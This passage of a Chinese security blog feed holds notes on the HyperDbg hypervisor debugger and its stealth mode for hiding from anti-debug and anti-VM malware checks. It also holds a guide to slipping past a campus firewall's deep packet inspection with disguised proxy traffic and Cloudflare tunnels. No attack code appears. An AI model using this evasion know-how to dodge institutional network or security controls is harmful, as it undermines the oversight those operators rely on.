Mode</h3><p>虚拟机自省（Virtual Machine Introspection）模式用于常规的用户程序调试与内核模式本地调试，虽然其提供了传统的调试体验与所有的 HYPERDBG 功能，但内核模式的断点与步入受限；VMI 也允许在本地&#x2F;远程调试中在用户态&#x2F;内核态运行脚本与代码</p><h3 id="3-3-2-Debugger-Mode"><a href="#3-3-2-Debugger-Mode" class="headerlink" title="3.3.2 Debugger Mode"></a>3.3.2 Debugger Mode</h3><p>调试器模式（Debugger Mode）允许通过串口或虚拟串行设备连接到内核并暂停系统以单步调试用户与内核指令</p><h3 id="3-3-3-Transparent-Mode"><a href="#3-3-3-Transparent-Mode" class="headerlink" title="3.3.3 Transparent Mode"></a>3.3.3 Transparent Mode</h3><blockquote><p>笔者注：经典 X 大有 X + 1 个（</p></blockquote><p>透明模式（Transparent Mode）可以同时使用这两种模式，其通过隐藏 HYPERDBG 在时间与微架构级别的存在来提供隐身调试，第 6 节描述了使用的透明技术，第 7.1 皆进行了评估</p><h1 id="0x04-BACK-END-ARCHITECTURE"><a href="#0x04-BACK-END-ARCHITECTURE" class="headerlink" title="0x04. BACK-END ARCHITECTURE"></a>0x04. BACK-END ARCHITECTURE</h1><p>本节在子系统级探索 HYPERDBG 的架构设计</p><h2 id="4-1-Stepping-Subsystem"><a href="#4-1-Stepping-Subsystem" class="headerlink" title="4.1 Stepping Subsystem"></a>4.1 Stepping Subsystem</h2><p>本节研究传统调试器的步入机制的缺点，并讨论 HYPERDBG 作为 VMX-root 模式调试器的解决方案</p><h3 id="4-1-1-Step-in"><a href="#4-1-1-Step-in" class="headerlink" title="4.1.1 Step-in"></a>4.1.1 Step-in</h3><p>步入（Step-in）通过设置 RFLAGS trap 标志位让系统在执行单条指令后停止，以让调试器读取&#x2F;修改寄存器与内存</p><p><strong>Challenge.</strong> 传统步入机制无法确保逐行步入过程，因为可能转移到其他 CPU 核心执行，中断可能彻底改变执行流</p><p>图 2a 是一个步入执行流被 #DB 异常中断打乱的例子，一个简单的解决方案是清除 RFLAGS 的中断标志位来屏蔽外部中断，但很容易破坏操作系统语义；HYPERDBG 引入了 <em>插桩步入</em> （Instrumental Step-in）来确保调试中的步入机制</p><p><strong>Approach.</strong> HYPERDBG 通过使用 Monitor Trap Flag （对 Guest 透明，类似 <code>RFLAGS::TF</code> ）引入插桩步入机制，非可屏蔽中断（Non-Maskable Interrupts，NMIs）用来确保操作在一个核心上执行、其他核心挂起</p><p><img src="https://s2.loli.net/2024/09/23/xbRJdLfjqUwz75h.png"></p><h3 id="4-1-2-Instrumentation-Step-in"><a href="#4-1-2-Instrumentation-Step-in" class="headerlink" title="4.1.2 Instrumentation Step-in"></a>4.1.2 Instrumentation Step-in</h3><p>HYPERDBG 是据作者所知第一个提供了确保步入方法的调试器，如图 2c 所示，在 Guest 执行目标指令后会触发 VM-exit（设置了 MTF），HYPERDBG 仅在该核心上继续执行且禁止中断（设置 VMCS）以提供细粒度的步入，这提供了其他调试器（如 WinDbg）所没有的特性，例如在用户模式执行 <code>SYSCALL</code> 指令时 HYPERDBG 允许直接执行接下来进入内核的指令（SYSCALL handler），或类似的缺页异常 handler，或 <code>SYSRET</code> 、<code>IRET</code> 指令</p><h3 id="4-1-3-Step-over"><a href="#4-1-3-Step-over" class="headerlink" title="4.1.3 Step-over"></a>4.1.3 Step-over</h3><p>步过（step-over）机制中调试器会把 call 指令的长度发给被调试者（而非设置 Trap 标志位），设置硬件调试寄存器以在 call 完成后触发并通知调试器下一条指令；由于其他线程&#x2F;核心也可能触发硬件调试寄存器，HYPERDBG 忽视来自其他线程&#x2F;进程 ID 的 #DBs，并重置调试寄存器直到到正确的执行上下文与目标线程，图 2b 展示了 HYPERDBG 的单步跳过机制，在检查调用指令后，下一条指令将会抛出断点异常（Breakpoint Exception，#DB）</p><h2 id="4-2-Hooking-Subsystem"><a href="#4-2-Hooking-Subsystem" class="headerlink" title="4.2 Hooking Subsystem"></a>4.2 Hooking Subsystem</h2><p>Hooking 即拦截任意事件、运行任意指令、将执行流返回到事件入口点的行为</p><p><strong>Challenge.</strong> 现有调试器的 hooking 系统使用可以被检测的直接内存访问，且 <em>硬件调试寄存器</em> （Hardware Debug Registers）的数量与大小是固定的，这限制了 Hooking 的性能</p><h3 id="4-2-1-SYSCALL-and-SYSRET-Hooks"><a href="#4-2-1-SYSCALL-and-SYSRET-Hooks" class="headerlink" title="4.2.1 SYSCALL and SYSRET Hooks"></a>4.2.1 SYSCALL and SYSRET Hooks</h3><p>HYPERDBG 通过清除扩展特性启用寄存器（Extended Feature Enable Register,即 <code>IA32_EFER</code> ）的 SCE 位触发未定义操作异常（undefined opcode exception，#UD）并检查异常源头以实现 hooking 功能，用户可以执行任意脚本并为任意系统调用进入（SYSCALL）或返回（SYSRET）设置 hooks ，调试器可以在实际执行指令前监视&#x2F;执行&#x2F;修改系统上下文</p><p><strong>Approach.</strong> HYPERDBG 通过两种 EPT hooking 机制透明地监视与操纵内存访问，并模拟调试寄存器以超越此前的限制</p><h3 id="4-2-2-EPT-Hidden-Hook"><a href="#4-2-2-EPT-Hidden-Hook" class="headerlink" title="4.2.2 EPT Hidden Hook"></a>4.2.2 EPT Hidden Hook</h3><p>作者提出了对用户&#x2F;内核不可见的 EPT-level hooking ，在 HYPERDBG 中第一种是在目标机器内存中注入 #BP（0xcc）的传统 EPT hook，第二种利用了 <a href="https://www.cs.columbia.edu/~junfeng/10fa-e6998/papers/detours.pdf">Detours</a> 风格的 Hook，通过跳转到修补后的指令并在回调后返回到常规执行流以改变执行路径，后者虽然存在灵活性限制但避免了昂贵的 VM-exit</p><h3 id="4-2-3-Limitless-Simulating-of-Debug-Register-（monitor）"><a href="#4-2-3-Limitless-Simulating-of-Debug-Register-（monitor）" class="headerlink" title="4.2.3 Limitless Simulating of Debug Register （monitor）"></a>4.2.3 Limitless Simulating of Debug Register （monitor）</h3><p>EPT hooking 也允许通过触发事件触发器（event trigger）来模拟硬件调试寄存器以监视对任意地址范围的任意读写，并消除 HDR 的数量与长度限制</p><h2 id="4-3-Memory-Access-in-VMX-root-Mode"><a href="#4-3-Memory-Access-in-VMX-root-Mode" class="headerlink" title="4.3 Memory Access in VMX-root Mode"></a>4.3 Memory Access in VMX-root Mode</h2><p>安全内存访问是设计 hypervisor-level debugger 的一个挑战，因为许多场景都能导致系统挂起或异常（如在 VMX-root 访问用户地址空间），且无法通过现成的指令（如 <code>mov</code> ）解决</p><p><strong>Challenge.</strong> VMX-level 的安全内存访问极其复杂，通常的由 OS 处理会导致性能开销，但对很多场景而言安全且高效的内存访问是必要的 </p><p><strong>Approach.</strong> 作者提出了一系列策略来解决 VMX 内存管理的复杂性</p><h3 id="4-3-1-Discover-Page-table-Entries"><a href="#4-3-1-Discover-Page-table-Entries" class="headerlink" title="4.3.1 Discover Page-table Entries"></a>4.3.1 Discover Page-table Entries</h3><p>检查目标地址页面合法性的传统方法是检查页表中是否有合法的 PTE（并设置了 present 位），作者使用无需在用户态与内核态间切换便能抑制异常的 Intel TSX 进行替代，通过检查包含目标地址的事务的成功执行来检查页面合法性，这仅需要如 Listing 1 所示的简短代码；HYPERDBG 对不支持 TSX 的处理器会在需要时回退到前一种方法；作者的实验证明在用户态能快三个数量级，但在内核态会由于 RTM routine 而减慢 40%</p><p><img src="https://s2.loli.net/2024/09/23/PN4KGjfC286poJY.png"></p><h3 id="4-3-2-Retrieving-a-Page-by-Injecting-Page-Fault-PF"><a href="#4-3-2-Retrieving-a-Page-by-Injecting-Page-Fault-PF" class="headerlink" title="4.3.2 Retrieving a Page by Injecting Page Fault (#PF)"></a>4.3.2 Retrieving a Page by Injecting Page Fault (#PF)</h3><p>HYPERDBG 在缺页时向被调试者注入缺页异常（通过修改 CR2 为目标虚拟地址）以请求 VMX non-root 从硬盘上带回该页</p><h3 id="4-3-3-VMX-root-Mode-Compatible-Message-Tracing"><a href="#4-3-3-VMX-root-Mode-Compatible-Message-Tracing" class="headerlink" title="4.3.3 VMX-root Mode Compatible Message Tracing"></a>4.3.3 VMX-root Mode Compatible Message Tracing</h3><p>VMX-root 与 VMX-non-root 间的消息传递面临巨大挑战，VMX-root 模式下访问分页池有诸多限制，绝大部分 NT 函数也不兼容任何 IRQL；HYPERDBG 使用对 VMX-root 可见的非分页池部署特制的消息追踪机制，细节在 <a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-8/">https://rayanfam.com/topics/hypervisor-from-scratch-part-8/</a> 中进行了彻底讨论</p><h3 id="4-3-4-Reading-and-Writing-Memory"><a href="#4-3-4-Reading-and-Writing-Memory" class="headerlink" title="4.3.4 Reading and Writing Memory"></a>4.3.4 Reading and Writing Memory</h3><p>出于多方面考虑，HYPERDBG 并不直接访问内存，但使用虚拟寻址方法保留 PTE 并映射对应物理内存到内核虚拟地址以安全地读写</p><h3 id="4-3-5-Pre-allocated-Pools"><a href="#4-3-5-Pre-allocated-Pools" class="headerlink" title="4.3.5 Pre-allocated Pools"></a>4.3.5 Pre-allocated Pools</h3><p>HYPERDBG 使用预分配池以解决传统上 VMX root 下无法分配内存的问题，其（4KB 粒度时）提供了 EPT hooks 所需的资源，HYPERDBG 的内存管理器会记录 VMX root 中所需的内存池中释放&#x2F;替换，并在 VMX non-root 中执行</p><h1 id="0x05-FRONT-END-ARCHITECTURE"><a href="#0x05-FRONT-END-ARCHITECTURE" class="headerlink" title="0x05. FRONT-END ARCHITECTURE"></a>0x05. FRONT-END ARCHITECTURE</h1><p>本节讨论连接后端的中间件与 UI</p><h2 id="5-1-Communicating-and-Task-Appliance"><a href="#5-1-Communicating-and-Task-Appliance" class="headerlink" title="5.1 Communicating and Task Appliance"></a>5.1 Communicating and Task Appliance</h2><p>用网络传输数据的 Windows API 由于中断在 VMX-root 下不可用而不切实际，且由于 IRQL 而需要额外的实现，因此 HYPERDBG 利用串口进行数据传输（如图 3 所示），其简化了设计并允许使用轮询，此外 HYPERDBG 可以使用 KDNet 进行通信</p><p><img src="https://s2.loli.net/2024/09/23/5U1QCYlmPdIHFkM.png" alt="image.png"></p><h3 id="5-1-1-Sending-Data-over-Serial"><a href="#5-1-1-Sending-Data-over-Serial" class="headerlink" title="5.1.1 Sending Data over Serial"></a>5.1.1 Sending Data over Serial</h3><p>HYPERDBG 支持最多四个串口，可以通过串行设备中断挂起被调试方而无需严格轮询，此后使用 <code>VMCALL</code> 返回 <code>VMX-root</code> 等待调试器后续命令</p><h3 id="5-1-2-Communication-between-Cores"><a href="#5-1-2-Communication-between-Cores" class="headerlink" title="5.1.2 Communication between Cores"></a>5.1.2 Communication between Cores</h3><p>HYPERDBG 在 VMX-root 模式通过 NMIs 挂起其他核心，或是不通知其他核而直接执行代码&#x2F;脚本</p><h2 id="5-2-Kernel-level-Script-Engine"><a href="#5-2-Kernel-level-Script-Engine" class="headerlink" title="5.2 Kernel-level Script Engine"></a>5.2 Kernel-level Script Engine</h2><p>现代调试器缺乏高性能与高可定制的脚本框架，因此作者从零开始设计了一个 VMX-enabled 的脚本引擎，据悉是仅有的可在 VMX-root 模式下提供高级特性如 OS 自旋锁、内存检查、辅助函数（如 printf）等的脚本引擎解决方案；脚本引擎的架构如图 4a 所示，其由一个后端（使用 <code>LL(1)</code> 与 <code>LALR(1)</code> 解析器以追求最大效率）与一个使用 MASM 风格与 C 关键字（如 <code>if/else/for</code> ）以及易定制的语法的前端组成 </p><p><img src="https://s2.loli.net/2024/09/24/841gSeGhCtM7LNJ.png"></p><p>用户输入的脚本被传递给 host 前端，由 lexer 扫描入，并被翻译为中间表示（Intermediate Representation），之后通过串口传输到 guest 的 kernel VMX-root 的一个缓冲区以供执行，之后一个缓冲区逐渐被用执行结果填充并传输回 host；这种方法与用在商业调试器（命令与脚本被逐行发送与解析）中的通过发送整个脚本到 VMX-root mode 并通过单向流响应回用户模式的传统的双向方法相比提供了较大的性能提升</p><h1 id="0x06-TRANSPARENCY-ANALYSIS"><a href="#0x06-TRANSPARENCY-ANALYSIS" class="headerlink" title="0x06. TRANSPARENCY ANALYSIS"></a>0x06. TRANSPARENCY ANALYSIS</h1><p>本节用恶意软件分析 HYPERDBG 的透明性</p><h2 id="6-1-Hypervisor-Detection-Methods-and-Mitigations"><a href="#6-1-Hypervisor-Detection-Methods-and-Mitigations" class="headerlink" title="6.1 Hypervisor Detection Methods and Mitigations"></a>6.1 Hypervisor Detection Methods and Mitigations</h2><p>检测子操作系统第三方程序（如 hypervisor）通过查询一组指示性的指纹，如注册表项、系统调用（例如查找运行的进程与加载的驱动）、指令（如 <code>CPUID/IDT/LDT</code> ），HYPERDBG 拦截并强制 VM-exit，模拟对应的非虚拟化环境的正常值来对抗，表 1 提供了此类方法的综合预览；更复杂的 VM 检测方法利用时间侧信道，核心思想是特定指令（如 <code>CPUID/GETSEC/INVD/XSETB</code> ）会造成 VM-exit 而执行时间更长，列表 2 展示了此类攻击的示例，接下来我们将描述 HYPERDBG 如何对抗此类检测方法</p><p><img src="https://s2.loli.net/2024/10/07/LbpTxDqA8gYW5ul.png" alt="Table 1: Anti-Debugging and Anti-VM exercises and mitigation in HyperDbg"></p><h2 id="6-2-Timing-Transparency-in-HYPERDBG"><a href="#6-2-Timing-Transparency-in-HYPERDBG" class="headerlink" title="6.2 Timing Transparency in HYPERDBG"></a>6.2 Timing Transparency in HYPERDBG</h2><p>HYPERDBG 的透明模式为隐藏虚拟化时间泄漏提供了一种通过识别检测 VM 的序列并将时间值替换为非虚拟化系统的解决方案，据作者所知 HYPERDBG 是第一个提供了修改分析软件用以检测虚拟化环境的时间指纹的实用手段的调试器，通过使用执行时间的统计模型，广泛时间分析被在 VMM 模块启动前执行，以尽可能接近 Guest OS 的正常运行条件的时间戳</p><p>作者使用二项高斯分布（two-term Gaussian Distribution）作为回归函数（regressor function），因为实验表明其非常适合对此类执行时间进行建模，图 5 显示了在启用与不启用 HyperDbg 的情况下运行列表 2 中序列的 10k 次执行的测量结果的概率分布函数（Probability Distribution Function），这些值可以被导出且统计参数可以被记录用于模拟目的</p><p><img src="https://s2.loli.net/2024/10/07/3fPpcDxsWkM68ma.png" alt="Listing 2: The timing measurement code by forcing VM-exit"></p><p><img src="https://s2.loli.net/2024/12/03/ZEgfdNcimw5xtr9.png" alt="Figure 5: PDF distribution of timing measurement for deactivated HyperDbg (a), with activated HyperDbg (b)"></p><p>HyperDbg 目前允许通过两种方法 cover 掉 VM 的时间泄漏：</p><ul><li>1）调整跟踪 CPU 时间的 MSR 寄存器（称为 <code>IA32_TIME_STAMP_COUNTER</code>），无需 VM-Exit 但会增加系统不稳定性</li><li>2）模拟 <code>RDTSC</code> 与 <code>RDTSCP</code> 指令的结果，需要 VM-Exit 因此引入额外复杂度</li></ul><p>时序指令的全局模拟会干扰系统的主要功能（作者在屏幕驱动与音频输出上进行了实验证明）</p><h2 id="6-3-Alternative-Timing-Attack-Methods"><a href="#6-3-Alternative-Timing-Attack-Methods" class="headerlink" title="6.3 Alternative Timing Attack Methods"></a>6.3 Alternative Timing Attack Methods</h2><p>HyperDbg 还有一些方法能阻碍恶意软件用各种类型的计时攻击探测时间，如在 HyperDbg 中有对 shared ticks 与硬件性能监视计数器（RDPMC）的内置支持</p><h1 id="0x07-EVALUATION"><a href="#0x07-EVALUATION" class="headerlink" title="0x07. EVALUATION"></a>0x07. EVALUATION</h1><h2 id="7-1-Transparency-Evaluation"><a href="#7-1-Transparency-Evaluation" class="headerlink" title="7.1 Transparency Evaluation"></a>7.1 Transparency Evaluation</h2><p>作者在提供了反调试压力测试的工具 <a href="https://github.com/a0rtega/pafish">pafish</a> 与 <a href="https://github.com/ayoubfaouzi/al-khaser">al-khaser</a> 上评估了 HyperDbg 的透明模式，如作者所料，第一种方法（更新 <code>IA32_TIME_STAMP_COUNTER</code>） 会干扰系统主要功能，而第二种方法（模拟）则成功通过这些工具，作者还在常见反调方法与商用软件上评估了 HyperDbg</p><h3 id="7-1-1-Evaluation-Configuration"><a href="#7-1-1-Evaluation-Configuration" class="headerlink" title="7.1.1 Evaluation Configuration"></a>7.1.1 Evaluation Configuration</h3><p>作者在不同类别的 10853 个恶意软件样本上分析，分别在 HyperDbg 的普通模式与透明模式进行测试，并与 x64dbg 与 WinDbg 对比，系统为 Windows 20H1；作者使用 C&#x2F;S 模式分发样本，并使用两种方法恢复系统：基于 <a href="https://dl.acm.org/doi/10.1145/2076732.2076790">Barebox</a> 的无需重启的方法与基于 Windows 系统还原的方法</p><p>**Barebox-based Approach **：作者首先使用基于 Barebox 的方法</p><h3 id="7-1-2-Evaluation-by-Anti-Debugging-VM-and-Hypervisor"><a href="#7-1-2-Evaluation-by-Anti-Debugging-VM-and-Hypervisor" class="headerlink" title="7.1.2 Evaluation by Anti-Debugging, -VM, and -Hypervisor"></a>7.1.2 Evaluation by Anti-Debugging, -VM, and -Hypervisor</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;猫猫帮你调试程序，猫好，人类奴役猫猫，人坏&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x02】如何在澳洲校园网内玩原神</title>
    <link href="https://arttnba3.github.io/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/"/>
    <id>https://arttnba3.github.io/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/</id>
    <published>2024-08-30T15:46:31.000Z</published>
    <updated>2024-11-11T10:50:18.866Z</updated>
    
    <content type="html"><![CDATA[<p>这个原神啊，能忍住一秒不玩的都是神人了</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>注：本文 <strong>仅</strong> 涉及<strong>澳洲大学校园</strong>的网络相关状况！ ！！<strong>不涉及也不适用任何澳洲境外的任何相关或无关场景！！！</strong></p></blockquote><p>众所周知笔者现在在南半球🇦🇺的某所不知名大学读 PhD <del>摆烂</del> 当中，虽然说日常畅游 GitHub 一类的网站没有啥问题，但是非常奇怪的是校园网当中居然也存在网站封锁，例如 <a href="https://www.taobao.com/">淘宝</a> 这样的中国购物网站就是上不去的：</p><p><img src="https://s2.loli.net/2024/09/11/TGRC8irBDyFcmaZ.png"></p><blockquote><p>包括原神也上不去，👴很愤怒💢</p></blockquote><p>虽然说 <em>在学校就该正经搞科研</em> ，但是笔者还是不太能忍受得了学校内各种网络封锁的存在，尤其是在笔者 <em>去年刚来那会在校园网内连 QQ 都登不上，只能用飞书聊天</em> ：</p><p><img src="https://s2.loli.net/2024/09/11/Nj3H5k7J4sbzQ6l.png"></p><p>总而言之相当数量的网站 <del>尤其是原神</del> 都上不去，对笔者的生活造成了不小的影响：</p><p><img src="https://s2.loli.net/2024/09/11/W37A2zSiabJNnC1.png"></p><p>因此笔者决定通过一些成熟的网络策略，在公有云上购买服务器做代理并架设一定的网络基础架构，以在学校内也能够重新登入一些笔者还在中国大陆的时候常用的一些网站 ： ） <del>比如玩原神</del></p><blockquote><p>注：笔者现在开始逐渐感觉自己的中文表达能力似乎在慢慢地有所下降了，不知道为啥：(</p></blockquote><h1 id="0x01-方案设计与准备工作"><a href="#0x01-方案设计与准备工作" class="headerlink" title="0x01. 方案设计与准备工作"></a>0x01. 方案设计与准备工作</h1><p>这一节简单讲一讲基本原理，以及笔者最终的方案设计： ）</p><blockquote><p>这一部分可能讲得不是很正确，因为笔者也不太懂，<del>有点愧对网安实验班出身…</del></p></blockquote><h2 id="Pre-网络代理"><a href="#Pre-网络代理" class="headerlink" title="Pre. 网络代理"></a>Pre. 网络代理</h2><p><strong>代理</strong> （Proxy）是一种特殊的服务，简单来说就是在进行互联网通信时客户端不直接向目标主机发送网络请求，而是先把请求发送给代理服务器，由代理服务器发送给目标主机，并接受响应数据再转发给客户端，这也叫 <strong>正向代理</strong> （Forward Proxy）</p><p><img src="https://s2.loli.net/2024/09/11/5HqDEysJgb7eLdn.png"></p><p>相应地，有正向就有反向， <strong>反向代理</strong> （Reverse Proxy）主要是在服务端侧，其负责将客户端发来的请求转发给真正的服务端</p><p><img src="https://s2.loli.net/2024/09/11/57pIuhJ6PHQaY1w.png"></p><blockquote><p>例如 <a href="https://nginx.org/en/">NGINX</a> 便是一个非常有名的有着反向代理功能的 Web 服务器软件</p><p><img src="https://s2.loli.net/2024/09/11/q5o1EeXMIdwxGNH.png"></p></blockquote><p>我们不难想到的是，有了代理服务器的存在，我们便可以将网络请求发送给代理服务器，让代理服务器替代我们进行实际的网络请求，由于我们的代理服务器并不在防火墙限制的网站&#x2F;IP列表当中，由此我们便能借助代理服务器访问被防火墙所禁止访问的网络服务， <del>例如让👴在校园网玩原神</del></p><p><img src="https://s2.loli.net/2024/09/11/7PhaTAnFjBvLJGM.png" alt="例如欧美国家有的学校会把 Facebook 给墙了，利用代理就能上 Facebook"></p><h2 id="Pre-信道加密与包检测对抗"><a href="#Pre-信道加密与包检测对抗" class="headerlink" title="Pre. 信道加密与包检测对抗"></a>Pre. 信道加密与包检测对抗</h2><p>但是有了代理服务器并不代表我们就能直接在澳洲校园网里畅玩原神了，部分防火墙会对传输的数据包进行检测，例如传统的 HTTP 和 SOCKS5 代理都是非加密的，无论是目的地还是内容都很容易便能被检测出来：</p><p><img src="https://s2.loli.net/2024/09/11/YkH1SPdZygBhrM5.png"></p><p>如何对抗各种包检测技术？最简单的方法自然是给数据包进行加密与混淆，从而使得防火墙无法检测出这些流量的真正目的，例如使用 Shadowsocks、Trojan 等加密协议来隐藏代理流量的特征，或是与代理服务器之间组建 VPN，通过 VPN 间建立的加密信道来保护流量隐私：</p><p><img src="https://s2.loli.net/2024/09/11/Ph1xRkJBMf65UEs.png"></p><p>但正所谓道高一尺魔高一丈，这些加密协议终究 <strong>存在一些特殊的内容或是行为特征</strong> ，例如 VMess 协议可以通过重放攻击的方式进行判定，此外 <strong>深度包检测技术</strong> （Deep Packet Inspection）会在传统的对数据包请求头进行检测的基础之上再对数据包的内容进行检测，如果发现了相应的指纹特征，便会进行阻断：</p><p><img src="https://s2.loli.net/2024/09/11/khVOWTJKSPdzbNo.png"></p><blockquote><p>许多网络设备、硬件防火墙厂商都有支持 DPI 的产品，例如 Advantech 家的 <a href="https://www.advantech.com/en-us/resources/case-study/33a34926-ded6-4cb1-a357-21de674c2200">FWA-6520</a></p><p><img src="https://s2.loli.net/2024/09/11/X7TPaKLUbilQFh9.png"></p></blockquote><p>但是深度包检测等技术终究不是万能的，针对 Shadowsocks 这种非主流协议进行阻断不会对正常通信造成太大影响，但是若是防火墙连最常见的加密流量类型都拦截则会直接影响正常的网络通信，例如 TLS （Transport Layer Security）协议是一种广泛采用的安全性协议，HTTPS 便是 <code>HTTP over TLS</code> ，Websocket 则允许我们在 HTTP 协议上建立全双工的通信，我们不难想到的是使用 HTTPS 进行通信，或是通过 Websocket over TLS 我们便能将代理流量伪装成普通的 Web 应用的流量，内部再使用 <a href="https://xtls.github.io/en/config/outbounds/vless.html">VLESS</a> 、<a href="https://github.com/trojan-gfw/trojan">Trojan</a> 等协议进行代理，从而轻松欺骗过学校的防火墙</p><blockquote><p>以前还有使用 TLS over TLS 的，不过这样据说流量就又呈现出可被检测的特征了：(</p><p>但是两层 TLS 其实并非不常见，例如当我们使用基于 TLS 的代理浏览 HTTPS 网站时，外层是 TLS 代理，内层是网站的 TLS，由此便又有了两层整合成一层的 <a href="https://xtls.github.io/">XTLS</a> </p></blockquote><h2 id="Pre-VPS-购买"><a href="#Pre-VPS-购买" class="headerlink" title="Pre. VPS 购买"></a>Pre. VPS 购买</h2><p>笔者在 Vultr 上买了一台 Singapore 的 VPS，6 USD 每月，选择 Singapore 主要的原因是离国内比较近访问国内网站会比较方便，选 Vultr 的主要原因则是因为可以随时暂停计费，方案比较灵活的同时价格也还算实惠</p><blockquote><p>像 banwagong 这样的老牌 VPS 并不适合笔者，总不能流量包先从澳洲跑一趟美国再跑回国内再原路返回澳洲吧，那样延迟就上天了，对笔者而言最优选择还是数据包线路能尽量和国内形成一条直线： ）</p></blockquote><p><img src="https://s2.loli.net/2024/09/11/s1GDHYUCQ7IVWEB.png"></p><blockquote><p>当然，如果你只是纯粹的 VPS 爱好者，单纯想随便买点 VPS 来玩玩，笔者也有一些非常非常便宜的 VPS 可以推荐，例如 Cloudcone 的 <a href="https://app.cloudcone.com.cn/vps/263/create?token=cc-turns-7-cs-2">10刀一年的小 VPS</a>  或是 <a href="https://app.cloudcone.com.cn/vps/262/create?token=cc-turns-7-cs-1">12刀一年的小 VPS</a> ，或者是 RackNerd 的 <a href="https://www.rnvps.com/go-358">11 刀一年的小 VPS</a> ，<del>当然这种便宜货就不要想有太好的质量了</del>：</p><p><img src="https://s2.loli.net/2024/09/30/ijyQ2LxfCn4STkv.png" alt="反正笔者是买了一台以备不时之需"></p></blockquote><h2 id="Pre-域名购买"><a href="#Pre-域名购买" class="headerlink" title="Pre. 域名购买"></a>Pre. 域名购买</h2><p>因为我们后面要用 Cloudflare 做 CDN，所以直接上 Cloudflare 买一个就好了，反正不同的域名提供商之间价格差别也不算太大，在其他域名提供商买了再转到 Cloudflare 还会比较麻烦</p><p>例如买个 <code>114514beastsenbei.uk</code> ，一年只要 <code>4.94USD</code> ，少喝几杯饮料就省出来了： ）</p><p><img src="https://s2.loli.net/2024/09/18/ztD75NwACxynpQf.png"></p><blockquote><p>注：这个域名现在还没人注册，心动的先辈建议赶紧雷…雷厉风行地购买（大嘘</p></blockquote><h1 id="0x02-正式搭建代理服务器"><a href="#0x02-正式搭建代理服务器" class="headerlink" title="0x02. 正式搭建代理服务器"></a>0x02. 正式搭建代理服务器</h1><h2 id="配置域名解析和-Cloudflare-代理"><a href="#配置域名解析和-Cloudflare-代理" class="headerlink" title="配置域名解析和 Cloudflare 代理"></a>配置域名解析和 Cloudflare 代理</h2><p>主要是为了防止 IP 直连被封 IP 后面会很麻烦，以及避免服务器真实 IP 被探查到：</p><p><img src="https://s2.loli.net/2024/09/12/XfYnZj1a3icGKu2.png"></p><h2 id="配置-SSH-Tunnel"><a href="#配置-SSH-Tunnel" class="headerlink" title="配置 SSH Tunnel"></a>配置 SSH Tunnel</h2><p>用 ssh 直接连接 IP 比较危险，万一 IP 或者端口被学校封锁了直接连不上服务器就尴尬了，因此我们推荐使用 Cloudflare 创建 SSH Tunnel</p><blockquote><p>Cloudflare，👴滴超人！</p></blockquote><p>简而言之创建步骤首先是 <code>Zero Trust -&gt; Networks -&gt; Tunnels -&gt; Add a tunnel -&gt; Select Cloudflared -&gt; 命名 -&gt; 安装 Cloudflared -&gt; 配置 Route Traffic</code> </p><p>对于 openSUSE 而言，Tumbleweed 可以直接安装，Leap 则需要借助 OPI 安装 experimental package：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> opi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo opi cloudflared</span><br></code></pre></td></tr></table></figure><blockquote><p>实际上， Cloudflare 官网给出的安装 Cloudflared 的方式是非常原始的直接下载软件包并安装，而且只提供了 Deb 和 Rpm，为什么不直接传到各大发行版仓库呢：(</p></blockquote><p>完成 Cloudflare 安装后使用官网给的参数启动：</p><p><img src="https://s2.loli.net/2024/09/12/ZDevGiAkytf6BU9.png"></p><p>成功连接上后配置一下 Tunnel 类型等信息即可，注意这个域名不能与现有域名记录冲突：</p><blockquote><p><code>URL</code> 可以直接写 <code>127.0.0.1:22</code></p></blockquote><p><img src="https://s2.loli.net/2024/09/12/ANOrRq7LtK4ZUvH.png"></p><p>最后在本地也安装一个 <code>cloudflared</code> （本地不用创建 tunnel），并在 <code>.ssh/config</code> 中添加如下配置：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host 你的自定义域名<br>        HostName 你的自定义域名<br>        TCPKeepAlive yes<br>        <span class="hljs-keyword">User</span> <span class="hljs-title">arttnba3</span><br>        ServerAliveInterval <span class="hljs-number">15</span><br>        IdentityFile 你的私钥位置，例如~/.ssh/id_ed25519<br>        Port <span class="hljs-number">22</span><br>        ProxyCommand cloudflared access ssh --hostname %h<br></code></pre></td></tr></table></figure><p>之后便能通过域名连接了：</p><p><img src="https://s2.loli.net/2024/09/12/68RhKDnl2FWjoI3.png"></p><h2 id="TLS-证书配置"><a href="#TLS-证书配置" class="headerlink" title="TLS 证书配置"></a>TLS 证书配置</h2><h3 id="方法一：Let’s-Encrypt-ACMS-自动更新-TLS-证书（🕊）"><a href="#方法一：Let’s-Encrypt-ACMS-自动更新-TLS-证书（🕊）" class="headerlink" title="方法一：Let’s Encrypt + ACMS 自动更新 TLS 证书（🕊）"></a>方法一：Let’s Encrypt + ACMS 自动更新 TLS 证书（🕊）</h3><blockquote><p>你可以选择似乎是更加方便的 <a href="https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E">ACME</a> ，<del>反正笔者懒得研究这个东西该怎么用</del></p></blockquote><h3 